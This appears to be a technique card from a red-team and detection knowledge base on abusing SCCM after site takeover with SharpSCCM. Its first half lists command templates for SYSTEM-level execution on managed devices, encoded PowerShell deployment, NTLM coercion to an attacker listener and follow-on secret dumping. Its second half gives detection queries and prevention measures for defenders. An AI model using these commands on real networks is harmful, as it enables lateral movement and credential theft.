name: SharpSCCM - Application Deployment Execution (Post-Takeover)
description: After gaining SCCM Full Administrator (site takeover) or sufficient console rights, SharpSCCM's exec / the admin service can deploy an application or run a program against a target device or collection. SCCM installs run in the SYSTEM context on the client, so pushing a command, script, or installer provides reliable SYSTEM-level code execution and lateral movement across every managed endpoint - the payoff of SCCM compromise.
notes:
=== EXECUTE ON A DEVICE (runs as SYSTEM) ===
  # Deploy a one-liner / application to a specific device:
  SharpSCCM.exe exec -d <target> -p "<command>"
  # Target by resource id instead of name:
  SharpSCCM.exe exec -rid <resourceid> -p "powershell -enc <b64>"

=== COERCE A DEVICE TO AUTH (relay primitive) ===
  # exec can also force the client to authenticate to you (NTLM capture/relay):
  SharpSCCM.exe exec -d <target> -r <lhost>

=== VIA THE ADMIN SERVICE (REST) ===
  # With Full Admin, create an application + deployment to a collection:
  #   POST https://<smsprovider>/AdminService/wmi/SMS_Application
  #   then SMS_ApplicationDeployment to the target collection
  # or use the console / PowerShell cmdlets (New-CMApplication, Invoke-CMScript)

=== CLEANUP ===
  # Remove the application/deployment and collection membership you created
  SharpSCCM.exe exec --help   # review removal flags for the objects you added

=== WHY IT WORKS ===
  - SCCM client agent executes deployments as NT AUTHORITY\SYSTEM.
  - A Full Administrator can target any device or collection in the hierarchy.

=== ALTERNATIVES ===
  impacket psexec/wmiexec       # direct exec if you already hold creds
  Invoke-CMScript (console)     # built-in script execution

examples.label: Run a command on a device as SYSTEM
Target by resource id with encoded PS
Coerce a client to authenticate to you

recommended.note: Gain Full Administrator before deploying payloads.
Direct remote exec alternative once you hold creds.
Dump domain secrets after SYSTEM on key hosts.

defense.why_it_works: SCCM is designed to run deployed applications and scripts in the SYSTEM context on managed clients, and a Full Administrator can target any device or collection. An attacker who has taken over the site therefore has a sanctioned, built-in mechanism for SYSTEM-level execution estate-wide.
defense.prerequisites: SCCM Full Administrator (or Application Author/Deployment rights) and a reachable Management Point/admin service; the target devices must have the SCCM client installed and checking in.
defense.impact: SYSTEM-level code execution on any managed endpoint, enabling mass lateral movement, credential theft, and domain compromise.
defense.detection: [MITRE T1072] New application/package + deployment created and immediately targeted at a device or ad-hoc collection; CcmExec spawning cmd/powershell with suspicious arguments on clients; off-hours deployments from an unusual admin.
defense.artifacts: SCCM console audit (SMS_Application, SMS_Deployment creation); client AppEnforce.log / execmgr.log; Sysmon process creation where parent is CcmExec.exe spawning cmd.exe/powershell.exe; 4688 process-creation events under SYSTEM.
defense.splunk_spl:
index=windows EventCode=1 ParentImage="*CcmExec.exe" (Image="*cmd.exe" OR Image="*powershell.exe" OR Image="*rundll32.exe")
| stats count by Computer, Image, CommandLine
| where count > 0
defense.sentinel_kql:
DeviceProcessEvents
| where InitiatingProcessFileName =~ "CcmExec.exe"
| where FileName in~ ("powershell.exe", "cmd.exe", "rundll32.exe", "mshta.exe")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
defense.prevention: Limit SCCM Full Administrator and application-authoring roles (RBAC, least privilege, Tier 0); require approval workflows for new applications/deployments; alert on new app+deployment creation and on CcmExec spawning shells; enable Enhanced HTTP/PKI and monitor the admin service; review collection membership changes.

detections.name: SCCM client agent (CcmExec) spawns a command interpreter
detections.logic:
DeviceProcessEvents
| where InitiatingProcessFileName =~ "CcmExec.exe"
| where FileName in~ ("powershell.exe", "cmd.exe", "rundll32.exe", "mshta.exe")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName
detections.false_positives: Legitimate SCCM application/script deployments also spawn interpreters.
detections.tuning: Baseline approved deployments and packages; alert on interpreters with encoded/obfuscated command lines or outbound network activity.
